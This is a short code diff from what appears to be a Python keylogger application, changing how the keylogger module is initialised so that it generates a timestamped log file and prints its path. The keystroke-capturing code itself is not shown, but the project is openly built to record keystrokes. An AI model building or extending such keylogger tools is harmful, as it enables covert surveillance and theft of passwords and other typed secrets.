@@ -63,9 +63,9 @@ class AdvancedKeyloggerApp:
     def _initialize_modules(self):
         """Initialize all enabled modules"""
         if self.config.is_enabled("keylogger"):
-            log_file = self.config.get("keylogger.log_file", "logs/keylog.txt")
-            self.keylogger = Keylogger(log_file)
-            print("[+] Keylogger initialized")
+            # Pass None to let Keylogger auto-generate timestamped filename
+            self.keylogger = Keylogger()
+            print(f"[+] Keylogger initialized: {self.keylogger.log_file}")
         
         if self.config.is_enabled("advanced_logging"):
             log_dir = self.config.get("general.log_directory", "logs")
